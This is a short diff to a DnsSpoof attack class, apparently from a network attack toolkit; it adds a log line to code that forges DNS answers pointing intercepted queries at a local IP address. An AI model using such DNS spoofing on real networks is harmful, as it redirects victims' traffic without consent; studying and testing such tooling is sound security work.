@@ -39,6 +39,7 @@ class DnsSpoof(GenericAttack):
                                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
                 packet.set_payload(str(spoofed_pkt))
                 packet.accept()
+                log.info("%s spoofed with %s" %(pkt[DNS].qd.qname, domain))
             else:
                 packet.accept()
 
